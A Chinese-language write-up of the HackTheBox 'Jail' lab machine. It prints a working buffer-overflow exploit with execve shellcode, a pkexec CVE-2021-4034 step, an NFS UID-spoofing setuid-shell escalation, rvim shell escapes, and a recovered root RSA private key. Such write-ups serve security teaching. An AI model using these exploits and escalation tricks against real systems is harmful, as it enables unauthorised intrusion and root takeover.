---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "Jail"
linktitle: "Jail"
date: 2022-08-04T21:02:40+08:00
type: book
summary: ""
test: 
---


## 目录

-   [nmap扫描](#nmap扫描)
    -   [扫描web路径](#扫描web路径)
-   [代码分析：](#代码分析)
-   [漏洞的关键点](#漏洞的关键点)
    -   [IDA调试](#IDA调试)
-   [获取nobody shell](#获取nobody-shell)
-   [pkexec提权一步到位(非预期解)](#pkexec提权一步到位非预期解)
-   [正常提权](#正常提权)
    -   [nobody提权到frank](#nobody提权到frank)
    -   [伪造frank用户 访问nfs](#伪造frank用户-访问nfs)
    -   [frank提权到adm](#frank提权到adm)
    -   [adm提权到root](#adm提权到root)
    -   [下面的扯淡的社工解密时间](#下面的扯淡的社工解密时间)
    -   [恢复root公钥](#恢复root公钥)

### nmap扫描

```bash
nmap -A 10.10.10.34
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-28 22:27 EDT
Stats: 0:02:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.94% done; ETC: 22:32 (0:02:04 remaining)
Stats: 0:05:59 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 22:34 (0:00:16 remaining)
Nmap scan report for 10.10.10.34
Host is up (0.12s latency).
Not shown: 65257 filtered tcp ports (no-response), 272 filtered tcp ports (host-prohibited)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey:
|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)
80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS)
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      39526/tcp6  nlockmgr
|   100021  1,3,4      42846/udp6  nlockmgr
|   100021  1,3,4      46781/tcp   nlockmgr
|   100021  1,3,4      49806/udp   nlockmgr
|   100024  1          33052/udp   status
|   100024  1          34561/tcp   status
|   100024  1          49568/tcp6  status
|   100024  1          56922/udp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl    3 (RPC #100227)
7411/tcp  open  daqstream?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|_    OK Ready. Send USER command.
20048/tcp open  mountd     1-3 (RPC #100005)
```

发现以下端口信息：

```bash
22端口 ssh OpenSSH 6.6.1

80端口 http  Apache httpd 2.4.6 ((CentOS))

111端口  rpcbind

2049 nfs_acl

7411  未知服务

20048 mountd  nfs挂载守护进程

```

访问80端口，返回一个有意思的图片，没什么信息。

![](image/image_trgbGDYZgV.png)

#### 扫描web路径

```bash
feroxbuster -u http://10.10.10.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![](image/image_zv7SM80GyK.png)

发现目录 <http://10.10.10.34/jailuser，>

![](image/image_YyG0T2eqQ0.png)

compile.sh

```bash
gcc -o jail jail.c -m32 -z execstack
service jail stop
cp jail /usr/local/bin/jail
service jail start

```

但是`-z execstack` 禁用了数据区执行保护 (DEP)，也就是说如果jail.c的逻辑存在溢出问题，可以执行恶意指令。

那目标明确，接下来重点分析jail的源代码

jail.c

```bash
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

int debugmode;
int handle(int sock);
int auth(char *username, char *password);

int auth(char *username, char *password) {
    char userpass[16];
    char *response;
    if (debugmode == 1) {
        printf("Debug: userpass buffer @ %p\n", userpass);
        fflush(stdout);
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    } else {
        printf("Incorrect username and/or password.\n");
        return 0;
    }
    return 0;
}

int handle(int sock) {
    int n;
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);
    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {
            if (gotuser == 1 && gotpass == 1) {
                break;
            }
            if (strncmp(token, "USER ", 5) == 0) {
                strncpy(username, token+5, sizeof(username));
                gotuser=1;
                if (gotpass == 0) {
                    printf("OK Send PASS command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "PASS ", 5) == 0) {
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }
            }
            token = strtok(NULL, strchr);
        }
        if (gotuser == 1 && gotpass == 1) {
            break;
        }
    }
    if (auth(username, password)) {
        printf("OK Authentication success. Send command.\n");
        fflush(stdout);
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("Socket read error");
            return 0;
        }
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;
        }
    } else {
        printf("ERR Authentication failed.\n");
        fflush(stdout);
        return 0;
    }
    return 0;
}

int main(int argc, char *argv[]) {
    int sockfd;
    int newsockfd;
    int port;
    int clientlen;
    char buffer[256];
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    int n;
    int pid;
    int sockyes;
    sockyes = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) {
        perror("Setsockopt error");
        exit(1);
    }
    memset((char*)&server_addr, 0, sizeof(server_addr));
    port = 7411;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind error");
        exit(1);
    }
    listen(sockfd, 200);
    clientlen = sizeof(client_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);
        if (newsockfd < 0) {
            perror("Accept error");
            exit(1);
        }
        pid = fork();
        if (pid < 0) {
            perror("Fork error");
            exit(1);
        }
        if (pid == 0) {
            close(sockfd);
            exit(handle(newsockfd));
        } else {
            close(newsockfd);
        }
    }
}

```

### 代码分析：

建立了一个套接字，`AF_INET`(ipv4),`SOCK_STREAM`(tcp连接)，等会用`nc`作为客户端交互就行

![](image/image_6F61OB1oUo.png)

监听端口7411，fork子进程调用`handle()`，实现功能的代码都在`handle()`，结合nmap发现打开了7411端口，应该就是这个程序`jail`

![](image/image_u34Hmncnpr.png)

分析`handle()`有以下几种交互，

```bash
DEBUG 调试模式

#auth认证函数，硬编码，这里其实验证密码正确了，也没有什么后续的逻辑操作
#char username[256];
#char password[256];
USER admin  验证用户名
PASS 1974jailbreak!  验证密码

#这两个功能只是打印字符串，什么也不做
OPEN 打开监狱
CLOSE 关闭监狱

```

进入DEBUG调试模式

![](image/image_JdyKsZFFe4.png)

当先执行DEBUG模式，再进行密码认证的时候。会打印密码`userpass`的内存地址

![](image/image_1wtt49SBex.png)

打印了`userpass`的缓冲区地址

![](image/image_1BK2kYD7yJ.png)

通过重复执行，发现`userpass` 缓冲区地址是静态的

![](image/image_yNyukdWbeU.png)

### 漏洞的关键点

代码第21行`strcpy()` 将`password[256]`的值复制到`userpass[16]` ，导致`userpass`可以造成缓冲区溢出，

![](image/image_a4_6jQo-uh.png)

结合`compile.sh`脚本禁用了DEP，并且`userpass`的地址是静态的，可以尝试写入`shellcode` 执行命令

#### IDA调试

计算偏移量，strcpy()处下断点，

![](image/image_5GnZ3W8I5h.png)

50个字符串已经崩溃

![](image/image_jij6ItP3Jg.png)

FFFFCAC0-FFFFCAA0=20,十进制就是32字节，要留4个字节写return到shellcode(),所以偏移量是`28`字节。

![](image/image_uEn7dgEuTH.png)

构造exp

```bash
#插入字符由：填充字符+ret地址+结束符+shellcode组成

#填充字符到ESP，28个字符，python -c 'print("A"*28)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAA
#16进制userpass的内存地址+结束符（0xffffcaa0+ \x00）
\xc0\xca\xff\xff   

#shellcode
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6
\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80
\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6
\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\x31\xc9\xcd\x80";


```

在auth() return处下个断点，

![](image/image_2m9oq3dL6r.png)

调试跟进发现shellcode已经被转换成汇编代码执行，这段汇编代码实现Linux/x86 - execve(/bin/sh)

![](image/image_IJWjunTdVz.png)

<https://www.exploit-db.com/exploits/34060>

执行完这段汇编代码即可返回`sh shell`

python实现脚本` exp.py`

```python
#!/usr/bin/env python3

from pwn import *

userpass_addr= int(b'0xffffd610',16)   #这个地址要先通过DEBUG获取

if args['REMOTE']:
    ip = '10.10.10.34'
else:
    ip = '127.0.0.1'

# Get Leaked Address
shellcode =  b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80";

payload =  b"A"*28
payload += p32(userpass_addr + 32 )
payload += shellcode

p = remote(ip, 7411)
p.recvuntil(b"OK Ready. Send USER command.")
p.sendline(b"USER admin")
p.recvuntil(b"OK Send PASS command.")
p.sendline(b"PASS " + payload)

p.interactive()
```

\=====================================================

到这里分析结束，回到题目

### 获取nobody shell

先获取userpass\_addr地址

![](image/image_Ia0yMTi3g6.png)

执行

![](image/image_a2wJKedLn_.png)

### pkexec提权一步到位(非预期解)

\============================================================

![](image/image_eZpjj4i5vO.png)

本来想curl传脚本过去，但是好像超时了，不给访问网络，不知道是有策略还是什么原因

所以直接写

<https://github.com/dadvlingd/-CVE-2021-4034>

```bash
cat CVE-2021-4034-py2.py |base64

echo '{编码后的内容}' >/tmp/pk_base64

cat /tmp/pk_base64|base64 -d >/tmp/pk.py
```

![](image/image_Fzo7Ebs0iy.png)

\============================================================

### 正常提权

SELinux

一种嵌入linux内核的安全机制，目的是为了限制对文件和网络的策略访问，刚才curl超时可能和这个有关。

```bash
$ id
uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0

#context的意思是当前是system权限，并且没有限制什么服务，意思是我可以做任何事情（这里指的是SELinux策略没有限制nobody这个用户）
```

<https://baike.baidu.com/item/SELinux/8865268?fr=aladdin>

#### nobody提权到frank

sudo -l

`nobody` 可以执行`/opt/logreader/logreader.sh`，但是没权限看(后面回来看了也没什么信息)

![](image/image_5BxDaKuPDd.png)

根据nmap扫描出来的结果，2049端口是nfs服务

`showmount -e` 列出远程主机上的NFS共享目录

![](image/image_JZjAx5yJvR.png)

挂载之后发现什么也读不到，权限不够。并且`nfsshare`的权限组居然变成`kali`，

![](image/image_rmfbqkywo_.png)

使用前面拿到的`nobody shell`看一下nfs的配置文件/etc/exports

```bash
$ cat /etc/exports
/var/nfsshare *(rw,sync,root_squash,no_all_squash)
/opt *(rw,sync,root_squash,no_all_squash)
```

通过查看文档得知，NFS在提供服务时有一个用户映射的机制在里面，配置参数如下：

```bash
all_squash：所有访问用户都映射为匿名用户或用户组；
no_all_squash（默认）：访问用户先与本机用户匹配，匹配失败后再映射为匿名用户或用户组；
```

通过`nobody shell` 发现`frank` 用户组是`1000`，本地用户和靶机`frank`匹配失败，所以被映射为`1000`用户组 ，然后我本地`kali`的`gid=1000`所以前面看到远程挂载的用户组是`kali`&#x20;

![](image/image_EZu11j5wFV.png)

所以只要本地伪造一个用户`frank`，权限也设置为`frank:x:1000:1000:frank`，这个账户就有权限访问` /var/nfsshare` ，`/opt`

#### 伪造frank用户 访问nfs

我kali本地`uid=1000`，要先将`/etc/passwd`,` /etc/group` 里kali的编号1000都改为1001，然后本地创建`frank`

```bash
#-u 指定uid
useradd frank -u 1000

```

![](image/image_4kAIP9NhHC.png)

\==========================================================

后面测试发现nfs只匹配uid和gid，用户名不是frank也行，kali本身uid=1000的话就不用创建个新的账号这么麻烦了

\==========================================================

重新挂载`/var/nfsshare`

```bash
mkdir -p /mnt/nfsshare
chmod 777 /mnt/nfsshare  #不加的话frank没权限

#-o tcp 不加的话很卡
mount -t nfs -o tcp  10.10.10.34:/var/nfsshare/  /mnt/nfsshare/

```

现在用户组识别为`frank`

![](image/image_DvSjuGSfku.png)

nfs挂载服务无法直接执行`bash shell`远程弹回来, 但是可以将编译好的`bash shell`程序通过nfs服务上传到远程服务器，然后再添加`suid`，再通过靶机上`nobody` 执行上传的`bash shell`

因为设置了`suid`位的进程在执行的时候，拥有的权限是进程本身的属主权限，而不是执行的发起者

，在执行过程中，调用者会暂时获得该文件的所有者权限

意思就是`uid_1000_sh` 的文件所有者是`frank` ，当`uid_1000_sh`设置了`suid`位，用`nobody` 去执行`uid_1000_sh` 的时候，`uid_1000_sh` 会以`frank` 权限被执行，这样就可以导致提权。

```bash
frank@kali:/tmp$ cat uid_1000_bash.c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(1000, 1000, 1000);
    system("/bin/bash");
    return 0;
}

frank@kali:/tmp$ gcc -m32 uid_1000_bash.c -o /mnt/nfsshare/uid_1000_bash
frank@kali:/tmp$ chmod 7777 /mnt/nfsshare/uid_1000_bash

```

`nobody` 上执行后成功提权到`frank`

```bash
script /dev/null

/var/nfsshare/uid_1000_bash
```

![](image/image_N7Emp2uN6G.png)

这个shell不稳定，写个公钥用ssh连接

![](image/image_XBumleRusl.png)

```bash
[frank@localhost .ssh]$ $ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRKFfz2jS4mH1HmJMOhxCg0B/BbBLc4iDMYeR6wG1BKUeospV8EBwNnBDH+Qvg47XBBxhkjZGZToEELQ8ZFBeg7r75pSBkwxAaVG/sC9T8TEwqdr6a/G935eZXBFSzmuhV3sTlcKfMgb4tM5xdgNqRWcoCo3dwiYfya/6Bs6/1TEAmqWotGRjObhgcy95z8uObRmlvimEcLpdhUTJt10+2w63givJlP7OBOsFI4H4N4gMsh1NYQwyR2oUGYyc3suqkqnjDyzQ+7ezoje2sQr1Bg7AQqsI8YTh8ePElSTBEXc2/0WouqhwJ5jKMQP2jzGPF2RmKg9XghoIVQGdUBdh7998ABKyHdjJdWxk3ekNZoxnXp9tBlgVd2OQ8jUHW/sHi0anUwKY4ZhZ6SbJtOPJIm967oR5gLAUjPzVVYMHGSYajy1sJNXAYa9L/ro9F75O7H1cxZuWk7c6wUvJORB3tKovLr9gzKpshTXMDwIna9QzZcTkPBuNzpKVUJ2MHrGc= root@kali' >> /home/frank/.ssh/authorized_keys
```

登录

```bash
ssh -i /root/.ssh/id_rsa frank@10.10.10.34
```

![](image/image_U1_rcSxcVl.png)

#### frank提权到adm

sudo -l

![](image/image_wf2KxFoRRW.png)

`frank`可以以`adm`身份运行`rvim`，rvim是vim的一种

<https://linux.die.net/man/1/rvim>

命令写死了，参数无法注入

```bash
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

执行后进入文本编辑模式，常规`vim`可以在`末行模式`下输入`:![command]` 执行命令

![](image/image__zx51t50Z9.png)

但是rvim禁止执行shell命令

![](image/image_yLPSpB0K7n.png)

但是有绕过的方式

<https://gtfobins.github.io/>

末行模式下输入：

```bash
#方法一
:py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")

#方法二
:python import pty; pty.spawn("/bin/bash")


```

![](image/image_NstuSv2_jR.png)

确认后即可获得`adm shell`

![](image/image_hjBSJ_ps0o.png)

#### adm提权到root

adm没有运行任何进程，只能查找和adm有关的文件

```bash
find / -group adm 2>/dev/null | grep -v -e ^/proc
```

![](image/image_R3OfbG6W4I.png)

排除下来只有三个文件

```bash
/var/adm/.keys/note.txt
/var/adm/.keys/.local/.frank
/var/adm/.keys/keys.rar

```

#### 下面的扯淡的社工解密时间

\==========================================================

note.txt

```bash
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.

#翻译
来自管理员的注释：
弗兰克，最后一次，您的任何加密密码都必须是您的姓氏，后跟一个 4 位数字和一个符号。

```

.frank&#x20;

```bash
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!

#这个纯经验，没见过这个加密方式就解不了
解密网站：https://www.quipqiup.com/
解密结果：
Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!

关键信息：alcatraz 

```

keys.rar是压缩包(可以base64传出来解压看)

```bash
└─# file keys.rar
keys.rar: RAR archive data, v4, os: Unix

```

打开可以看到是root的公钥文件，但是需要密码

![](image/image__4lfoG3MO6.png)

结合`note.txt`和`.frank `，给出的信息和密码有关

```bash
密码是：Frank的姓氏+4位数字+1个符号
```

`Frank`(弗兰克)的姓氏结合`alcatraz`(恶魔岛)和题目名`jail`可以社工到这个人`Frank Morris`

<https://en.wikipedia.org/wiki/June_1962_Alcatraz_escape_attempt>

越狱事件是1962年，所以得到一个接近的密码

```bash
Morris1962 + 1个符号
```

还差一个符号，可以爆破了

使用工具`archpr`，掩码是`Morris1962?`

![](image/image_MrgdoAeR3H.png)

得到密码`Morris1962!`

![](image/image_FV5b2M6VyU.png)

解压得到rootauthorizedsshkey.pub

```bash
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
a99GCw==
-----END PUBLIC KEY-----

```

#### 恢复root公钥

RsaCtfTool这个工具可以将弱公钥恢复成私钥

<https://github.com/RsaCtfTool/RsaCtfTool>

安装这个工具的依赖

```bash

git clone https://github.com/RsaCtfTool/RsaCtfTool
#mpfr
wget https://www.mpfr.org/mpfr-current/mpfr-4.1.0.tar.bz2
tar -jxvf mpfr-4.1.0.tar.bz2 && cd mpfr-4.1.0
./configure
make && make check && make install
#mpc
wget ftp://ftp.gnu.org/gnu/mpc/mpc-1.1.0.tar.gz
tar -zxvf mpc-1.1.0.tar.gz && cd mpc-1.1.0
./configure
make && make check && make install

cd RsaCtfTool
python3 -m pip install -r requirements.txt

```

执行

```bash
python3 ./RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private
```

![](image/image_7rNFZkO8kW.png)

得到root私钥，保存位`jail-root`

```bash
-----BEGIN RSA PRIVATE KEY-----
MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
-----END RSA PRIVATE KEY-----
```

设置权限

```bash
chmod 600 ./jail-root
```

获得root权限

![](image/image_prJjyyInMX.png)
